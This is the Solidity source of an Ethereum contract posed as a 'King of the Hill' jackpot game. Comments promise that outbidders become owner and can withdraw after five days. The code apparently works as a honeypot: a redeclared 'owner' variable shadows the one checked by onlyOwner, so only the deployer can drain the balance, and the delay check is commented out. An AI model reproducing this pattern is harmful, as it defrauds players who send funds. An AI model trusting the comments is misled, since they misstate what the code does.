/**
 *Submitted for verification at Etherscan.io on 2017-11-10
*/

pragma solidity ^0.4.10;

// Simple Game. Each time you send more than the current jackpot, you become
// owner of the contract. As an owner, you can take the jackpot after a delay
// of 5 days after the last payment.

contract Owned {
    address owner;    function Owned() {
        owner = msg.sender;
    }
    modifier onlyOwner{
        if (msg.sender != owner)
            revert();        _;
    }
}

contract KingOfTheHill is Owned {
    address public owner;
    uint public jackpot;
    uint public withdrawDelay;

    function fallback() public payable {
        // transfer contract ownership if player pay more than current jackpot
        if (msg.value > jackpot) {
            owner = msg.sender;
            withdrawDelay = block.timestamp + 5 days;
        }
        jackpot+=msg.value;
    }

    function takeAll() public onlyOwner {
        // require(block.timestamp >= withdrawDelay);
        msg.sender.transfer(this.balance);
        jackpot=0;
    }
}